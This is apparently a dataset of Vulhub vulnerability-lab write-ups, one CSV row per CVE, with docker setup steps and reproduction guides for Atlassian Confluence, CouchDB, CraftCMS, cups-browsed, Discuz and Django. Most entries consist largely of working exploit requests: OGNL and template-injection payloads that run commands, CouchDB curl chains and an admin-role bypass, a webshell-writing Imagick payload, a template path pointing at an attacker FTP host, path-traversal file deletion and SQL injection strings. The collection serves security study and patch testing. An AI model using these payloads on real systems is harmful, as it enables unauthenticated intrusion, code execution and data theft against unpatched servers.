GET /%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/ HTTP/1.1
Host: your-ip:8090
Accept-Encoding: gzip, deflate
Accept: /
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Connection: close






The URL-decoded OGNL expression is ${(#a=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(""id"").getInputStream(),""utf-8"")).(@com.opensymphony.webwork.ServletActionContext@getResponse().setHeader(""X-Cmd-Response"",#a))}.
-------------------------------------------------------------------------------","https://confluence.atlassian.com/doc/confluence-security-advisory-2022-06-02-1130377146.html
https://attackerkb.com/topics/BH1D56ZEhs/cve-2022-26134/rapid7-analysis"
confluence,CVE-2023-22527,Atlassian Confluence Pre-Auth Remote Code Execution via OGNL Injection (CVE-2023-22527),"Atlassian Confluence Pre-Auth Remote Code Execution via OGNL Injection (CVE-2023-22527)

中文版本(Chinese version)

Confluence is a web-based corporate wiki developed by Australian software company Atlassian.

A OGNL injection vulnerability on versions (8.0 to 8.5.3) of Confluence Data Center and Server allows an unauthenticated attacker to achieve RCE on an affected instance.

References:
<https://confluence.atlassian.com/security/cve-2023-22527-rce-remote-code-execution-vulnerability-in-confluence-data-center-and-confluence-server-1333990257.html
<https://blog.projectdiscovery.io/atlassian-confluence-ssti-remote-code-execution/

Vulnerable Environment

Execute following command to start a Confluence Server 8.5.3:


docker compose up -d


After the environment starts, visit http://your-ip:8090 and you will see the installation guide, select ""Trial installation"", then you will be asked to fill in the license key. You should apply for a Confluence Server test certificate from Atlassian.

Following this guide to complete the installation.

On the database configuration page, fill in the form with database address db, database name confluence, username postgres, password postgres.



Exploit

Simplely send following request to execute arbitrary commands inside an craft OGNL expression and get the response:


POST /template/aui/text-inline.vm HTTP/1.1
Host: localhost:8090
Accept-Encoding: gzip, deflate, br
Accept: /
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.159 Safari/537.36
Connection: close
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Content-Length: 285

label=\u0027%2b#request\u005b\u0027.KEY_velocity.struts2.context\u0027\u005d.internalGet(\u0027ognl\u0027).findValue(#parameters.x,{})%2b\u0027&x=@org.apache.struts2.ServletActionContext@getResponse().setHeader('X-Cmd-Response',(new freemarker.template.utility.Execute()).exec({""id""}))




After the version 7.18.0, Confluence introduced a isSafeExpression function to protect OGNL injection. Security researcher Alvaro Muñoz find a way to bypass it through #request['.KEY_velocity.struts2.context'].internalGet('ognl').findValue(String, Object), the full decoded payloads are here:


'+(#request['.KEY_velocity.struts2.context'].internalGet('ognl').findValue(@org.apache.struts2.ServletActionContext@getResponse().setHeader('X-Cmd-Response',(new freemarker.template.utility.Execute()).exec({""id""})),{}))+'
-------------------------------------------------------------------------------","https://confluence.atlassian.com/security/cve-2023-22527-rce-remote-code-execution-vulnerability-in-confluence-data-center-and-confluence-server-1333990257.html
https://blog.projectdiscovery.io/atlassian-confluence-ssti-remote-code-execution/"
confluence,CVE-2021-26084,Atlassian Confluence Webwork Pre-Auth OGNL Injection Leads to RCE (CVE-2021-26084),"Atlassian Confluence Webwork Pre-Auth OGNL Injection Leads to RCE (CVE-2021-26084)

中文版本(Chinese version)

Confluence is a web-based corporate wiki developed by Australian software company Atlassian.

An OGNL injection vulnerability exists that allows an unauthenticated attacker to execute arbitrary code on a Confluence Server or Data Center instance.

References
https://confluence.atlassian.com/doc/confluence-security-advisory-2021-08-25-1077906215.html
https://jira.atlassian.com/browse/CONFSERVER-67940
https://github.com/httpvoid/writeups/blob/main/Confluence-RCE.md
https://github.com/h3v0x/CVE-2021-26084_Confluence

Vulnerable Environment

Execute following command to start a Confluence Server 7.4.10:


docker compose up -d


After the environment starts, visit http://your-ip:8090 and you will see the installation guide, select ""Trial installation"", then you will be asked to fill in the license key. You should apply for a Confluence Server test certificate from Atlassian.

Following this guide to complete the installation.

On the database configuration page, fill in the form with database address db, database name confluence, username postgres, password postgres.



Exploit

There are multiple API endpoints that are affected by this vulnerability.

/pages/doenterpagevariables.action

This is a pre-auth exploit, executing 233*233:


POST /pages/doenterpagevariables.action HTTP/1.1
Host: your-ip:8090
Accept-Encoding: gzip, deflate
Accept: /
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 47

queryString=%5cu0027%2b%7b233*233%7d%2b%5cu0027




Executing arbitrary commands:


queryString=%5cu0027%2b%7bClass.forName%28%5cu0027javax.script.ScriptEngineManager%5cu0027%29.newInstance%28%29.getEngineByName%28%5cu0027JavaScript%5cu0027%29.%5cu0065val%28%5cu0027var+isWin+%3d+java.lang.System.getProperty%28%5cu0022os.name%5cu0022%29.toLowerCase%28%29.contains%28%5cu0022win%5cu0022%29%3b+var+cmd+%3d+new+java.lang.String%28%5cu0022id%5cu0022%29%3bvar+p+%3d+new+java.lang.ProcessBuilder%28%29%3b+if%28isWin%29%7bp.command%28%5cu0022cmd.exe%5cu0022%2c+%5cu0022%2fc%5cu0022%2c+cmd%29%3b+%7d+else%7bp.command%28%5cu0022bash%5cu0022%2c+%5cu0022-c%5cu0022%2c+cmd%29%3b+%7dp.redirectErrorStream%28true%29%3b+var+process%3d+p.start%28%29%3b+var+inputStreamReader+%3d+new+java.io.InputStreamReader%28process.getInputStream%28%29%29%3b+var+bufferedReader+%3d+new+java.io.BufferedReader%28inputStreamReader%29%3b+var+line+%3d+%5cu0022%5cu0022%3b+var+output+%3d+%5cu0022%5cu0022%3b+while%28%28line+%3d+bufferedReader.readLine%28%29%29+%21%3d+null%29%7boutput+%3d+output+%2b+line+%2b+java.lang.Character.toString%2810%29%3b+%7d%5cu0027%29%7d%2b%5cu0027




/pages/createpage-entervariables.action

This is also a pre-auth exploit:


POST /pages/createpage-entervariables.action HTTP/1.1
Host: your-ip:8090
Accept-Encoding: gzip, deflate
Accept: /
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 47

queryString=%5cu0027%2b%7b233*233%7d%2b%5cu0027


/pages/createpage.action

This exploit requires a user permission to create pages:


GET /pages/createpage.action?spaceKey=EX&src=quick-create&queryString=%5cu0027%2b%7b233*233%7d%2b%5cu0027 HTTP/1.1
Host: 192.168.1.162:8090
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://192.168.1.162:8090/template/custom/content-editor.vm
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7
Cookie: JSESSIONID=7B35600F54A9E303CE8C277ED960E1E7; seraph.confluence=524289%3A2ac32a308478b9cb9f0e351a12470faa4f2a928a
Connection: close
-------------------------------------------------------------------------------","https://confluence.atlassian.com/doc/confluence-security-advisory-2021-08-25-1077906215.html
https://jira.atlassian.com/browse/CONFSERVER-67940
https://github.com/httpvoid/writeups/blob/main/Confluence-RCE.md
https://github.com/h3v0x/CVE-2021-26084_Confluence
http://192.168.1.162:8090/template/custom/content-editor.vm"
couchdb,CVE-2017-12636,Couchdb Arbitrary Command Execution (CVE-2017-12636),"Couchdb Arbitrary Command Execution (CVE-2017-12636)

中文版本(Chinese version)

Apache CouchDB is an open-source document-oriented NoSQL database, implemented in Erlang. CouchDB uses multiple formats and protocols to store, transfer, and process its data. It uses JSON to store data, JavaScript as its query language using MapReduce, and HTTP for an API.

CouchDB administrative users can configure the database server via HTTP(S). Some of the configuration options include paths for operating system-level binaries that are subsequently launched by CouchDB. This allows an admin user in Apache CouchDB before 1.7.0 and 2.x before 2.1.1 to execute arbitrary shell commands as the CouchDB user, including downloading and executing scripts from the public internet.

Chain CVE-2017-12635 and CVE-2017-12636 to get a unauthenticated remote command execution.

Reference link.
https://justi.cz/security/2017/11/14/couchdb-rce-npm.html
https://www.exploit-db.com/exploits/44498
http://bobao.360.cn/learning/detail/4716.html

Vulnerable Environment

API interfaces of Couchdb 2.x and and 1.x are somewhat different, so this vulnerability is exploited in a different way. This environment is about version 1.6.0, if you want to test version 2.1.0, you can use the CVE-2017-12635.

Start a Couchdb 1.6.0 server.


docker compose up -d


After the startup is complete, browse http://your-ip:5984/ to see the welcome page of Couchdb.

Exploit explanation

CVE-2017-12636 is a post-authentication RCE, so if you do not know the target administrator password, you can use CVE-2017-12635 to add an administrator user first.

Exploit under 1.x

Execute the following requests in sequence to trigger arbitrary command execution.


curl -X PUT 'http://vulhub:vulhub@your-ip:5984/config/queryservers/cmd' -d '""id /tmp/success""'
curl -X PUT 'http://vulhub:vulhub@your-ip:5984/vultest'
curl -X PUT 'http://vulhub:vulhub@your-ip:5984/vultest/vul' -d '{""_id"": ""770895a97726d5ca6d70a22173005c7b""}'
curl -X POST 'http://vulhub:vulhub@your-ip:5984/vultest/tempview?limit=10' -d '{""language"": ""cmd"", ""map"":""""}' -H 'Content-Type: application/json'


Here, vulhub:vulhub is the administrator account and password.

The first request is to add a query_servers with the name cmd and the value ""id /tmp/success"", which is the command we are going to execute later.

The second and third requests are to add a database and document, which can be queried only after it is added here.

The fourth request is to do a query in this Database, a query_servers named cmd that I added in the first step is used, and finally trigger the command execution.

Exploit under 2.x

The two APIs I used above have been modified in 2.1.0 and need to be explained in detail here.

Couchdb 2.x introduces clustering, browser the /_membership to get the node list.


curl http://vulhub:vulhub@your-ip:5984/_membership




As you can see, we have only one node here, with the name nonode@nohost.

Then, modify the configuration of node nonode@nohost as follows.


curl -X PUT http://vulhub:vulhub@your-ip:5984/node/nonode@nohost/config/query_servers/cmd -d '""id /tmp/success""'




Then, in the same way as the 1.6.0 exploit:


curl -X PUT 'http://vulhub:vulhub@your-ip:5984/vultest'
curl -X PUT 'http://vulhub:vulhub@your-ip:5984/vultest/vul' -d '{""_id"": ""770895a97726d5ca6d70a22173005c7b""}'


Couchdb 2.x removed tempview, so we need to add a view in order to trigger the command defined in queryservers:


curl -X PUT http://vulhub:vulhub@your-ip:5984/vultest/design/vul -d '{""id"":""_design/test"", ""views"":{""woyun"":{""map"":""""} },"" language"": ""cmd""}' -H ""Content-Type: application/json""


Then commands in query_servers will be executed.

POC script

I wrote a simple POC exp.py, modified the target and command inside the script to your test target, then modified the version to the corresponding Couchdb version (1 or 2), and successfully get the reverse shell:
-------------------------------------------------------------------------------","https://justi.cz/security/2017/11/14/couchdb-rce-npm.html
https://www.exploit-db.com/exploits/44498
http://bobao.360.cn/learning/detail/4716.html
http://vulhub:vulhub@your-ip:5984/_membership
http://vulhub:vulhub@your-ip:5984/_node/nonode@nohost/_config/query_servers/cmd
http://vulhub:vulhub@your-ip:5984/vultest/_design/vul"
couchdb,CVE-2017-12635,Apache Couchdb Remote Privilege Escalation (CVE-2017-12635),"Apache Couchdb Remote Privilege Escalation (CVE-2017-12635)

中文版本(Chinese version)

Apache CouchDB is an open-source document-oriented NoSQL database, implemented in Erlang. CouchDB uses multiple formats and protocols to store, transfer, and process its data. It uses JSON to store data, JavaScript as its query language using MapReduce, and HTTP for an API.

Due to differences in the Erlang-based JSON parser and JavaScript-based JSON parser, it is possible in Apache CouchDB before 1.7.0 and 2.x before 2.1.1 to submit users documents with duplicate keys for roles used for access control within the database, including the special case admin role, that denotes administrative users.

Reference link.
https://justi.cz/security/2017/11/14/couchdb-rce-npm.html
https://www.exploit-db.com/exploits/44498
http://bobao.360.cn/learning/detail/4716.html

Setup Environment

Compile and start environment.


docker compose up -d


After the environment is started, browse http://your-ip:5984/_utils/ to see a web page, which means Couchdb has been started successfully. But you can do nothing without authentication.

Exploit

This is a normal request to add a user.


PUT /_users/org.couchdb.user:vulhub HTTP/1.1
Host: your-ip:5984
Accept: /
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/json
Content-Length: 90

{
  ""type"": ""user"",
  ""name"": ""vulhub"",
  ""roles"": [""_admin""],
  ""password"": ""vulhub""
}


As you can see, a 403 error is returned: {""error"": ""forbidden"", ""reason"": ""Only _admin may set roles""}, which means only administrator can use the endpoint.



To bypass the restriction by sending a request containing duplicate roles.


PUT /_users/org.couchdb.user:vulhub HTTP/1.1
Host: your-ip:5984
Accept: /
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/json
Content-Length: 108

{
  ""type"": ""user"",
  ""name"": ""vulhub"",
  ""roles"": [""_admin""],
  ""roles"": [],
  ""password"": ""vulhub""
}


Successfully created a user vulhub, with the password vulhub.



Log in.
-------------------------------------------------------------------------------","https://justi.cz/security/2017/11/14/couchdb-rce-npm.html
https://www.exploit-db.com/exploits/44498
http://bobao.360.cn/learning/detail/4716.html"
couchdb,CVE-2022-24706,CouchDB Erlang distribution Remote Command Execution (CVE-2022-24706),"CouchDB Erlang distribution Remote Command Execution (CVE-2022-24706)

中文版本(Chinese version)

Apache CouchDB is an open-source document-oriented NoSQL database, implemented in Erlang.

Apache CouchDB is written in Erlang and so it has built-in support for distributed computing (clustering). The cluster nodes communicate using the Erlang/OTP Distribution Protocol, which provides for the possibility of executing OS command requests as the user running the software.

In order to connect and run OS commands, one needs to know the secret phrase or in Erlang terms the ""cookie"". The CouchDB installer in versions 3.2.1 and below, by default, sets the cookie to ""monster"".

References:
<https://docs.couchdb.org/en/3.2.2-docs/cve/2022-24706.html
<https://insinuator.net/2017/10/erlang-distribution-rce-and-a-cookie-bruteforcer/
<https://github.com/rapid7/metasploit-framework/blob/master//modules/exploits/multi/misc/erlangcookierce.rb
<https://github.com/sadshade/CVE-2022-24706-CouchDB-Exploit

Vulnerability Environment

Execute following command to start a Apache CouchDB 3.2.1:


docker compose up -d


After service is started, 3 port will be listening on target-ip:
5984: Web interface for Apache CouchDB
4369: Erlang port mapper daemon (epmd)
9100: clustered operation and runtime introspection port (command is actually executed through this port)

In practice, Web interface and epmd service port is fixed, clustered operation port is random. We can accesses the EPMD service to obtain the clustered operation port number.

Exploit

We can just use this poc to exploit this vulnerability. The poc does 2 things, firstly obtain the clustered operation port from epmd service, then use default cookie to execute arbitrary commands in clusters.


python poc.py target-ip 4369
-------------------------------------------------------------------------------","https://docs.couchdb.org/en/3.2.2-docs/cve/2022-24706.html
https://insinuator.net/2017/10/erlang-distribution-rce-and-a-cookie-bruteforcer/
https://github.com/rapid7/metasploit-framework/blob/master//modules/exploits/multi/misc/erlang_cookie_rce.rb
https://github.com/sadshade/CVE-2022-24706-CouchDB-Exploit"
craftcms,CVE-2023-41892,CraftCMS ConditionsController Pre-Auth Remote Code Execution (CVE-2023-41892),"CraftCMS ConditionsController Pre-Auth Remote Code Execution (CVE-2023-41892)

中文版本(Chinese version)

Craft CMS is a flexible, user-friendly CMS for creating custom digital experiences on the web. It provides users with a backend interface to implement websites and configure the CMS.

A vulnerability in Craft CMS versions 4.4.0 through 4.4.14 allows unauthenticated attackers to achieve remote code execution through the ConditionsController. The vulnerability exists due to insufficient input validation in the controller's beforeAction method, which can be exploited to create arbitrary objects and achieve code execution.

References:
<https://github.com/craftcms/cms/security/advisories/GHSA-4w8r-3xrw-v25g
<https://blog.calif.io/p/craftcms-rce
<https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/

Environment Setup

Execute the following command to start a vulnerable Craft CMS 4.4.14:


docker compose up -d


After the server is running, you can see the installation page at http://your-ip:8088/admin/install. Please follow the instructions to install CraftCMS, the default database address is db and the username and password are both root.



Vulnerability Reproduction

The root cause of the vulnerability is that the attacker can send a specially crafted HTTP request to create arbitrary objects through PHP object injection. By chaining multiple gadgets in the codebase, the attacker can achieve remote code execution.

There are two common gadgets that can be used to achieve remote code execution.

Gadget 1: craft\elements\conditions\users\UserCondition with \Psy\Configuration

This gadget requires server logging to be enabled, which is enabled by default.

First, send a POST request with a syntax error JSON to write the payload to the log file:


POST /index.php?action=conditions/render HTTP/1.1
Host: localhost:8088
Content-Type: application/json

{
aaaaaaaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaaaaaaa
<?php
@phpinfo(); halt_compiler();
?
}




Then, trigger the remote code execution by including the log file through the \Psy\Configuration gadget (replace the 2025-03-31 with your current date):


POST /index.php?action=conditions/render HTTP/1.1
Host: localhost:8088
Content-Type: application/json

{
  ""config"": {
    ""name"": ""test"",
    ""as xyz"": {
      ""class"": ""\\Psy\\Configuration"",
      ""construct()"": {
        ""config"": {
          ""configFile"": ""../storage/logs/web-2025-03-31.log""
        }
      }
    }
  },
  ""test"": ""craft\\elements\\conditions\\users\\UserCondition""
}




As you can see, the PHPINFO is executed successfully.

Gadget 2: craft\elements\conditions\users\UserCondition with built-in Imagick class

If the Imagick extension is enabled, you can use the Imagick class with MSL format to write arbitrary files:


POST /index.php?action=conditions/render HTTP/1.1
Host: localhost:8088
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarytlNPtAxuuGOeUqqY
-----WebKitFormBoundarytlNPtAxuuGOeUqqY
Content-Disposition: form-data; name=""test""

craft\elements\conditions\users\UserCondition
-----WebKitFormBoundarytlNPtAxuuGOeUqqY
Content-Disposition: form-data; name=""config[name]""

test
-----WebKitFormBoundarytlNPtAxuuGOeUqqY
Content-Disposition: form-data; name=""config[as xyz][class]""

imagick
-----WebKitFormBoundarytlNPtAxuuGOeUqqY
Content-Disposition: form-data; name=""config[as xyz][construct()][0][0]""

vid:msl:/tmp/php*
-----WebKitFormBoundarytlNPtAxuuGOeUqqY
Content-Disposition: form-data; name=""file""; filename=""1.msl""
Content-Type: text/plain

<?xml version=""1.0"" encoding=""UTF-8""?
<image
  <read filename=""caption:&lt;?=phpinfo();?&gt;""/
  <write filename=""info:webshell.php"" /
</image
-----WebKitFormBoundarytlNPtAxuuGOeUqqY--


This payload will execute PHP code like new Imagick('vid:msl:/tmp/php*');, and cause the ""Segmentation fault"" error, which makes the thread crash:



But the webshell.php file is written successfully:
-------------------------------------------------------------------------------","https://github.com/craftcms/cms/security/advisories/GHSA-4w8r-3xrw-v25g
https://blog.calif.io/p/craftcms-rce
https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/"
craftcms,CVE-2024-56145,CraftCMS registerargcargv Leads to Remote Code Execution (CVE-2024-56145),"CraftCMS registerargcargv Leads to Remote Code Execution (CVE-2024-56145)

中文版本(Chinese version)

CraftCMS is a PHP-based content management system for building websites and applications.

CraftCMS version before 5.5.2 and 4.13.2 is vulnerable to remote code execution if the PHP setting registerargcargv is enabled. When registerargcargv is enabled, CraftCMS incorrectly reads configuration items from the HTTP request, allowing an attacker to control template files using the --templatesPath, which can lead to arbitrary code execution through template injection.

Reference:
<https://github.com/craftcms/cms/security/advisories/GHSA-2p6p-9rc9-62j9
<https://www.assetnote.io/resources/research/how-an-obscure-php-footgun-led-to-rce-in-craft-cms

Vulnerable Environment

Execute the following command to start a CraftCMS server 5.5.1.1:


docker-compose up -d


After the server is running, you can see the installation page at http://<your-ip:8088/admin/install. Please follow the instructions to install CraftCMS, the default database address is db and the username and password are both root.



Vulnerability Reproduction

To reproduce the vulnerability, you need to prepare a craft index.twig file which contains the following content, then place it on any remote server:

twig
{{ ['system', 'id'] | sort('calluserfunc') | join('') }}


Then start a FTP server in the server where the index.twig file is located:

bash
install pyftpdlib
pip install pyftpdlib

start a FTP server
python -m pyftpdlib -p 21212 -V


Then you can exploit the vulnerability by sending the following request:


http://<your-ip:8088/?--templatesPath=ftp://<evil-ip:21212/




As you can see, the id command is executed and the output is returned.
-------------------------------------------------------------------------------","https://github.com/craftcms/cms/security/advisories/GHSA-2p6p-9rc9-62j9
https://www.assetnote.io/resources/research/how-an-obscure-php-footgun-led-to-rce-in-craft-cms"
cups-browsed,CVE-2024-47177,OpenPrinting Cups-Browsed Remote Code Execution via The FoomaticRIPCommandLine PPD parameter (CVE-2024-47177),"OpenPrinting Cups-Browsed Remote Code Execution via The FoomaticRIPCommandLine PPD parameter (CVE-2024-47177)

中文版本(Chinese version)

OpenPrinting CUPS (Common Unix Printing System) is an open-source printing system developed for Unix-like operating systems. It allows computers to act as print servers, managing local and network printers efficiently. Cups-Browsed is a daemon that is part of the CUPS system, specifically designed to browse for remote printers shared by other CUPS servers on the network. It facilitates automatic discovery and configuration of network printers, making it easier for users to access and use shared printing resources across a network without manual setup.

In the version 2.0.1 and before of Cups-Browsed, there is an issue from improper handling of the FoomaticRIPCommandLine parameter in PPD (PostScript Printer Description) files. An attacker can exploit this vulnerability by creating a malicious IPP (Internet Printing Protocol) server that sends crafted printer information to a vulnerable Cups-Browsed instance, then execute arbitrary command on the system that vulnerable Cups-Browsed is running.

Reference:
<https://www.evilsocket.net/2024/09/26/Attacking-UNIX-systems-via-CUPS-Part-I/
<https://github.com/OpenPrinting/cups-browsed/security/advisories/GHSA-rj88-6mr5-rcw8

Vulnerable Environment

Execute the following command to start a CUPS server 2.4.7 and vulnerable cups-browsed 2.0.1:


docker-compose up -d


After the server is running, you can access the CUPS web interface via http://<your-ip:631.

Exploit

First, download the evil-ipp-server project and run the poc.py:


python poc.py [evil-ipp-server-ip] [target-ip]


This script will start a evil IPP server on the [evil-ipp-server-ip] and send a UDP packet to the vulnerable Cups-Browsed on the target machine which IP is [target-ip].

Once the Cups-Browsed received the request, it will try to connect to the evil IPP server. The IPP server will send back some attributes including a crafted printer-privacy-policy-uri attribute. The payload structure likes following:

python
(
    SectionEnum.printer,
    b'printer-privacy-policy-uri',
    TagEnum.uri
): [b'https://www.google.com/""\n*FoomaticRIPCommandLine: ""' +
    b'echo 1 /tmp/IAMVULNERABLE' +
    b'""\n*cupsFilter2 : ""application/pdf application/vnd.cups-postscript 0 foomatic-rip'],


After that, Cups-Browsed will create a temporary PPD file in /tmp/ and our payload will be injected in the file. The screenshot below shows the related logs from Cups-Browsed:



At this time, the command haven't been executed, because we need at least one print job to trigger the execution of the command.

Print jobs can come from regular users or attackers. If TCP port 631 is open, we can use a browser to access it and find the malicious IPP server we just added, then create a ""test page printing"" job:



Then you can see, the echo 1 /tmp/IAMVULNERABLE command has been executed successfully.
-------------------------------------------------------------------------------","https://www.evilsocket.net/2024/09/26/Attacking-UNIX-systems-via-CUPS-Part-I/
https://github.com/OpenPrinting/cups-browsed/security/advisories/GHSA-rj88-6mr5-rcw8"
discuz,Unknown,Discuz!X ≤3.4 Arbitrary File Deletion,"Discuz!X ≤3.4 Arbitrary File Deletion

中文版本(Chinese version)

Discuz!X is a popular forum software widely used in China. A vulnerability in Discuz!X versions 3.4 and below allows attackers to delete arbitrary files on the server through the user profile modification functionality.

References:
<https://lorexxar.cn/2017/09/30/dz-delete/

Environment Setup

Execute the following command to deploy Discuz!X 3.4:


docker compose up -d


During installation, only modify the database host to db and keep other settings as default:



Vulnerability Reproduction

First, verify that the target file (e.g., robots.txt) exists by visiting http://your-ip/robots.txt:



After registering a user account, find your formhash value in the personal settings page:



Send the following HTTP request with your cookie and formhash:


POST /home.php?mod=spacecp&ac=profile&op=base HTTP/1.1
Host: localhost
Content-Length: 367
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryPFvXyxL45f34L12s
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.79 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,/;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8,en;q=0.6
Cookie: [your cookie]
Connection: close
-----WebKitFormBoundaryPFvXyxL45f34L12s
Content-Disposition: form-data; name=""formhash""

[your formhash]
-----WebKitFormBoundaryPFvXyxL45f34L12s
Content-Disposition: form-data; name=""birthprovince""

../../../robots.txt
-----WebKitFormBoundaryPFvXyxL45f34L12s
Content-Disposition: form-data; name=""profilesubmit""

1
-----WebKitFormBoundaryPFvXyxL45f34L12s--


After successful submission, the birthplace field in the user profile page will show the following state:



This indicates that our malicious data has been inserted into the database.

Next, create an upload.html file with the following code (replace [your-ip] with your Discuz domain and [form-hash] with your formhash):

html
<body
    <form action=""http://[your-ip]/home.php?mod=spacecp&ac=profile&op=base&profilesubmit=1&formhash=[form-hash]"" method=""post"" enctype=""multipart/form-data""
        <input type=""file"" name=""birthprovince"" /
        <input type=""submit"" value=""upload"" /
    </form
</body


Open this page in a browser and upload a normal image file. At this point, the malicious data should have been processed and the vulnerability exploitation is complete.

Visit http://your-ip/robots.txt again to verify that the file has been successfully deleted:
-------------------------------------------------------------------------------",https://lorexxar.cn/2017/09/30/dz-delete/
discuz,Unknown,Discuz 7.x/6.x Remote Code Execution via Global Variable Override,"Discuz 7.x/6.x Remote Code Execution via Global Variable Override

中文版本(Chinese version)

Discuz is a popular forum software widely used in China. A remote code execution vulnerability exists in Discuz 7.x/6.x versions due to insufficient global variable protection.

In PHP 5.3.x, the default value of requestorder in php.ini is set to ""GP"", which means $REQUEST no longer includes $_COOKIE by default. This allows attackers to override global variables through cookies by injecting $GLOBALS, leading to remote code execution.

References:
<https://www.secpulse.com/archives/2338.html

Environment Setup

Execute the following command to start Discuz 7.2:


docker compose up -d


After starting the container, visit http://your-ip:8080/install/ to install Discuz. Use the following database settings:
Database Host: db
Database Name: discuz
Username: root
Password: root



Vulnerability Reproduction

After installation, find an existing post and send a request with the following cookie that contains the payload GLOBALS[DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[DCACHE][smilies][replacearray]=phpinfo();:


GET /viewthread.php?tid=10&extra=page%3D1 HTTP/1.1
Host: your-ip:8080
Accept-Encoding: gzip, deflate
Accept: /
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Cookie: GLOBALS[DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[DCACHE][smilies][replacearray]=phpinfo();
Connection: close




The phpinfo() function will be successfully executed, demonstrating the remote code execution vulnerability:



Note: Some articles online claim that a post with an emoji comment is required, but the actual test found that it was not necessary, and the reason still needs to be analyzed from the code.
-------------------------------------------------------------------------------",https://www.secpulse.com/archives/2338.html
django,CVE-2021-35042,Django QuerySet.order_by() SQL Injection (CVE-2021-35042),"Django QuerySet.order_by() SQL Injection (CVE-2021-35042)

中文版本(Chinese version)

Django is a high-level Python web framework that encourages rapid development and clean, pragmatic design.

Django released a security update on July 1, 2021, which fixes a SQL injection vulnerability in the QuerySet.order_by() function. This vulnerability affects Django versions before 3.2.5, 3.1.13.

The vulnerability can be exploited when a user has control over the input passed to the order_by() function, allowing for SQL injection at the expected column position.

References:
<https://www.djangoproject.com/weblog/2021/jul/01/security-releases/

Environment Setup

Execute the following command to compile and start a vulnerable Django 3.2.4 server:


docker compose build
docker compose up -d


After the server is started, you can access the Django home page at http://your-ip:8000.

Vulnerability Reproduction

First, visit http://your-ip:8000/vuln/ and add the parameter order=-id to see the data sorted by ID in descending order:



To exploit the SQL injection vulnerability, modify the order parameter with the following payload, where vuln_collection is the model name:


http://your-ip:8000/vuln/?order=vuln_collection.name);select updatexml(1, concat(0x7e,(select @@version)),1)%23


The SQL error message will be displayed, revealing database information through the error-based SQL injection:
-------------------------------------------------------------------------------",https://www.djangoproject.com/weblog/2021/jul/01/security-releases/
django,CVE-2019-14234,Django JSONField/HStoreField SQL Injection (CVE-2019-14234),"Django JSONField/HStoreField SQL Injection (CVE-2019-14234)

中文版本(Chinese version)

Django is a high-level Python web framework that encourages rapid development and clean, pragmatic design.

Django released a security update on August 1, 2019, which fixes a SQL injection vulnerability in the JSONField and HStoreField model fields. This vulnerability affects Django versions before 2.2.4, 2.1.11, and 1.11.23.

The vulnerability requires the developer to use JSONField/HStoreField, and the field name of the queryset can be controlled by the user. Django's built-in admin interface is affected by this vulnerability, providing an easy way to demonstrate the issue.

References:
<https://www.djangoproject.com/weblog/2019/aug/01/security-releases/
<https://www.leavesongs.com/PENETRATION/django-jsonfield-cve-2019-14234.html

Environment Setup

Execute the following command to compile and start a vulnerable Django 2.2.3 server:


docker compose build
docker compose up -d


After the server is started, you can access the Django home page at http://your-ip:8000.

Vulnerability Reproduction

First, log in to the Django admin interface at http://your-ip:8000/admin/ using the following credentials:
Username: admin
Password: a123123123

Navigate to the Collection model's list view at http://your-ip:8000/admin/vuln/collection/:



To exploit the SQL injection vulnerability, add detaila'b=123 to the GET parameters, where detail is the JSONField:


http://your-ip:8000/admin/vuln/collection/?detaila%27b=123


The SQL error message will be displayed, confirming the successful injection:
-------------------------------------------------------------------------------","https://www.djangoproject.com/weblog/2019/aug/01/security-releases/
https://www.leavesongs.com/PENETRATION/django-jsonfield-cve-2019-14234.html"
